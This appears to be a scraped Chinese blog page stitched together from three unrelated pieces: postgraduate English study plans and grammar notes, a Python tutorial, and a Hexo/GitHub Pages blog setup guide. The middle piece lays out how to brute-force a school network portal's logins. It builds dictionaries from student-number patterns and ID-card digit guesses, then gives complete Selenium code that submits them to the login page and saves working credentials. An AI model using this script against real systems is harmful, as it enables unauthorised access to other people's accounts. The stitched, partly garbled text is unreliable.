##英语
第一阶段（准备阶段）：9月-年前
1.看单词书（你还在背单词吗）5-7天看一遍
2.搞定语法
第二阶段（基础阶段）：3初-6月底
1.搞定考研词汇
1996-2005考研真题（不做题，只看完形填
空、阅读理解、和翻译的文章，精读全文并记录
生词在真题上，背生词所在的句子）
2.搞定考研长难句
第三阶段：7月-11/20（做题阶段）：2006-2019年所有真题
1.先听课
第四阶段：最后一个月
1.复习之前做的东西
2.做模拟题两套按照英语考试时间
资料： 一、你还在背单词吗
二、语法长难句
三、历年真题

英语中必须含有主语和宾语并且主语一定是谓语的发出者，
宾语一定是谓语的承受者

1.简单句

分类：
x表示出现几率几乎没有

  • 1.主谓结构

  • 2.主谓宾

    谓语:实意动词（有实际意义的动词）

  • 3.主谓表

    谓语:系动词

    1.be动词
2.感官动词：look、smell、taste（n.兴趣）、sound（your sound sounds sound）、feel
3.翻译为变化的词：become、get
4.翻译为保持的词：keep、stay、remain
  • 4.x 主谓双宾
  • 5.x 主谓宾宾补

（重要）句子的成分（词性）：

一.谓语

  1. 谓语的成分 :

    your mother must very beautful

    有时态的实义动词或系动词充当谓语

  2. 一句话中动词能不能多？
    绝对不能，一句话中只能有一个动词的存在并且充当谓语，多余的动词全部都要变成非谓语动词。

    beat you is my fault

    I enjoy watch TV

    My dream is become a teacher

1. 谓语只能是动词
2. 动词只能做谓语
3. 所以我们需要把一句话当中，所有不做谓语的动词全部都要不是动词（非 谓语动词）（v+ing（主动）,v+ed（被动）,to+v（目的））

        注：在多个动词中谁的意思最重要谁就是谓语动词

        he beating my shoulder,saying nothing,departed

        他拍了拍我的肩膀什么都没说就离开了

        I loving you,you love me(独立主格)

        我爱你，你爱我

        winter approaching,spring will be around the corner

        冬天来了，春天也在拐角处了

  1. 一句话中动词能不能少？绝对不能，当一句话需要动词而没有动词，永远都加be动词且be动词没有意思。

    your mother must be very beautiful

谓语总结：一句话中有且仅有一个有时态的实义动词或系动词充当谓语

二. 主语

能充当主语的的成分名词、代词(只替代名词)、非谓语动词、从句

错误的 hansome and strong are his nature
正确的：being hansome and strong is his nature
非谓语充当主语谓语动词用单数

主语能不能少？绝对不能，若没有主语呢？

  1. 加it作为主语（必须和天气、温度有关系）

    it feels exceedingly cold in BeiJing(北京天气很冷)

  2. 添加there be/exist/seem/remain

    there exist a sea of private individuals having passion for me
    有很多人喜欢我

  3. (重要)被动语气表示主语（只要听到人称代词作主语都可以考虑被动）

    authorities should be proposed to adopt action
    很多人建议政府采取建议
    confidence is claimed exceedingly imdispensable by an increasing amount of private individuals
    以下三种情况没有被动：

    1.如果动词后有介词（不及物动词） 例如：we go to shcool
    2.所有的系动词都没有被动
    3.‘have’翻译为有没有被动

  4. 人称代词（不到万不得已不要用）i,you,we

    抽空改改你的脾气（翻译）
Time should be spared to relieve your temper

Python 暴力测试

人生苦短我用Python：

###大致步骤如下：

  • 生成字典（学号字典和密码字典）
  • 使用python 来自动化填入账号密码并提交到服务器
  • 处理登陆结果和登陆失败
  • 使用多线程提高效率

1.开始这条不归路
首先是生成账号字典和密码字典：

账号的特征是入学年级+所在系别的序号+在专业的学号 如1632010表示16级 专业年级为3 2010表示学号 整体就是一个网号

然后是密码：密码的特征是身份证后六位即前两位是1~31 后四位随机总共就有31*10^4种（忽略最后带x的）好多啊

这个就是简单生成账号密码的文件（没有高深的算法所以代码有点长 结果也有点多）

2.神奇的第三方模块selenium

安装及配置教程：点我
这里我们需要做的是:

  • 用python自动打开一个浏览器并填入登陆网址
  • 定位大账号输入、密码输入和登陆按钮
    （由于学校的登陆密码上传到服务器是加密的而且还不是一般的加密，所以只能出此下策）

打开一个浏览器并输入网址

driver = webdriver.Firefox()#打开一个Firefox浏览器

driver.get("http://192.168.100.100")#输入登陆页面

使用xpath定位输入框和按钮

账号框：elem = driver.find_element_by_xpath('//*[@id="exampleInputEmail1"]')

密码框:elemp = driver.find_element_by_xpath('//*[@id="exampleInputPassword1"]')

登陆按钮:login_button = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div[2]/form/input[7]')

在输入数据之前需要将文本框的内容都清空

elem.clear()和elemp.clear()

接下来开始填入数据：

填入账号：elem.send_keys(u)u表示账号 字符串类型

填入密码：elem.send_keys(p)

最后执行：login_button.click()执行登陆操作

到此一次登陆操作就完成了

你也可以使用多线程来提高效率（即多开几个浏览器）

下面是完整代码（残次品）

`

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import AccountAndPassword,os,random,threading
os.chdir('C:\\Users\\Turbo\\Desktop\\python2')#更换到此工作目录
accfile = open('.\\account.txt','a')#将登陆成功的信息写入到这个文件
users = []
passw = []
users = AccountAndPassword.accountNum(users)
passw = AccountAndPassword.Password(passw)
def crackAcc():
    driver = webdriver.Firefox()#打开一个Firefox浏览器
    while  '认证系统'  not in driver.title:
        driver.get("http://192.168.100.100")#输入登陆页面
    # assert "百度" in driver.title#用assert的方式确认标题是否包含“百度”一词
    elem = driver.find_element_by_xpath('//*[@id="exampleInputEmail1"]')
    elemp = driver.find_element_by_xpath('//*[@id="exampleInputPassword1"]')
    login_button = driver.find_element_by_xpath('/html/body/div[1]/div[2]/div[2]/form/input[7]')
    print(len(users),len(passw))
    while users !=None:
        u = users.pop(random.randint(0,len(users)))
        elem.clear()
        elem.send_keys(u)
        for p in passw:            
            elemp.clear()
            elemp.send_keys(p)
            login_button.click()
            try:
                alert = driver.switch_to_alert()
            except Exception:
                alert = None            
            if alert==None:
                print(u+' : '+p+'登录成功')
                accfile.write(u+' : '+p+'登录成功')
                break
            elif '不存在'in alert.text:
                print(u+' : '+alert.text)
                alert.accept()
                break
            else:
                # print(type(alert.text))
                alert.accept()

t1 = threading.Thread(target=crackAcc)
t1.start()
t1.join()

hexo 从零开始到完整搭建

前言

其实平时自己写的文章并不多，偶尔看到一些东西会做点笔记，但是每次写的东西都会到处放，不好找，所以才想着自己搭建一个人博客网站，现在大家用hexo比较多，也比较方便，并且能使用的主题也很多，所以小花就用她啦~

本篇为从零开始的基础篇，其他SEO、评论系统、统计等请看Hexo博客添加SEO-评论系统-阅读统计-站长统计

  • 本篇所包含的内容如下：

    1.安装Git Bash

   2.安装NodeJs

  3.安装hexo

  4.生成SSH并添加到github

  5.部署项目

  6.上传到github

7.绑定个人域名

8.修改及配置主题

9.添加RSS

10.添加评论

11.写文章部分

1. 安装Git Bash

  • Git Bash(点我下载)
  • 安装步骤：双击下载好的exe文件，一路next就好啦
  • 安装好后，打开gitbash，查看版本：
    • 命令：git version

2. 安装NodeJs

Hexo是基于nodeJS环境的静态博客，里面的npm工具很有用啊

  • Nodejs(说明：LTS为长期支持版，Current为当前最新版)
  • 安装步骤：反正下载好msi文件后，双击打开安装，也是一路next，不过在Custom Setup这一步记得选 Add to PATH ,这样你就不用自己去配置电脑上环境变量了，装完在按 win + r 快捷键调出运行，然后输入cmd确定，在cmd中输入path可以看到你的node是否配置在里面（环境变量），没有的话你就自由发挥吧
  • 查看版本：
    • node -v

3. 安装hexo

这是关键的工具了,不用到网上去下载直接打开git命令行

  • 先在本地硬盘创建一个存放你博客文件的文件夹
  • 获取hexo: 打开git，输入npm i -g hexo
  • 安装完成后，查看版本：hexo -v
  • 初始化命令：hexo init，初始化完成之后打开所在的文件夹可以看到以下文件：
  • 解释一下：
    • node_modules：是依赖包
    • public：存放的是生成的页面
    • scaffolds：命令生成文章等的模板
    • source：用命令创建的各种文章
    • themes：主题
    • _config.yml：整个博客的配置
    • db.json：source解析所得到的
    • package.json：项目所需模块项目的配置信息

接下来就是配置了！！！

4. 搭桥到github

  • 首先创建一个github的账号有的自动忽略 传送门
  • 接下来就是取名字了，这个名字关乎到你的博客网站的名字 所以认真取个名字吧
  • 创建仓库如图：yourname.github.io
  • 回到gitbash中，配置github账户信息（YourName和YourEail都替换成你自己的）：
  • 创建SSH:
    • 在gitbash中输入：ssh-keygen -t rsa -C "youremail@example.com，生成ssh。然后按下命令的方式找到id_rsa.pub文件的内容。
      • cd ~/.ssh和cat id_rsa.pub
    • 将其中的内容复制到github中,点击新建ssh keys title随便起 将复制的内容粘贴进key里面
    • 在gitbash中验证是否添加成功：ssh -T git@github.com
    • 没有成功的重复这一步或者百度原因

5. 一步之遥

  • 用编辑器打开你的blog项目，修改_config.yml文件的一些配置(冒号之后都是有一个半角空格的)：

    • 找到这段代码或自行添加

      deploy:
  type: git
  repo: https://github.com/YourgithubName/YourgithubName.github.io.git
  branch: master
  • 回到gitbash中，进入你的blog目录，分别执行以下命令：
hexo clean
hexo generate
hexo server
  • 注：hexo 3.0把服务器独立成个别模块，需要单独安装：npm i -g hexo-server。-g表示全局安装
  • 打开浏览器输入：http://localhost:4000

6. 上传到github

  • 先安装一波：npm -g install hexo-deployer-git --save（这样才能将你写好的文章部署到github服务器上并让别人浏览到）

  • 执行命令(建议每次都按照如下步骤部署)：

    hexo clean
hexo generate
hexo deploy
  • 在浏览器中输入http://yourgithubname.github.io就可以看到你的个人博客啦，是不是很兴奋！
